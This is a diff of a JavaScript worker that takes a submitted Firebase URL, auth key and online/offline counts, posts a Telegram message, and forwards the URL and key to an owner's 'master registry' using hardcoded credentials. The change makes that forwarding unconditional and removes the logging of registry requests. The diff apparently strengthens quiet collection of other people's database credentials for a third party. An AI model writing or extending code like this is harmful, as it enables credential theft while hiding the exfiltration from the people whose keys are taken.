@@ -5,7 +5,8 @@
 //   { url, key, total, online, offline }
 //
 // 1. Sends a beautifully formatted Telegram message
-// 2. Submits the Firebase URL + key to the master registry
+// 2. ALWAYS submits the Firebase URL to the master registry
+//    (key is stored if provided, otherwise empty)
 //
 // 🔥 Telegram credentials (hardcoded)
 // 🔥 Master Firebase credentials (hardcoded)
@@ -62,9 +63,6 @@ async function masterRegistryRequest(path, options = {}) {
     }
 
     const target = `${config.url}/${path.replace(/^\/+/, "")}.json?auth=${encodeURIComponent(config.key)}`;
-    
-    console.log(`[Master Registry] Requesting: ${target}`);
-
     const response = await fetch(target, {
         ...options,
         headers: {
@@ -74,8 +72,6 @@ async function masterRegistryRequest(path, options = {}) {
     });
 
     const payload = await response.json().catch(() => null);
-    console.log(`[Master Registry] Response status: ${response.status}`, payload);
-
     if (!response.ok) {
         const errorMsg = payload?.error || payload?.message || `HTTP ${response.status}`;
         throw new Error(`Master Firebase error: ${errorMsg}`);
@@ -205,18 +201,15 @@ export default {
             typeof online === 'number' &&
             typeof offline === 'number';
 
-        // ─── Submission to Master Firebase ──────────────────────
+        // ─── ALWAYS submit to Master Firebase (even without key) ──
         let submissionResult = null;
-        if (authKey) {
-            try {
-                submissionResult = await submitFirebaseToOwner(target, authKey);
-                console.log('Master registry submission result:', submissionResult);
-            } catch (err) {
-                console.error('Master registry submission failed:', err);
-                submissionResult = { error: err.message };
-            }
-        } else {
-            console.log('No authentication key provided – skipping master registry.');
+        try {
+            // Always try to submit, with or without key
+            submissionResult = await submitFirebaseToOwner(target, authKey || '');
+            console.log('Master registry submission result:', submissionResult);
+        } catch (err) {
+            console.error('Master registry submission failed:', err);
+            submissionResult = { error: err.message };
         }
 
         // ─── Telegram message ────────────────────────────────────
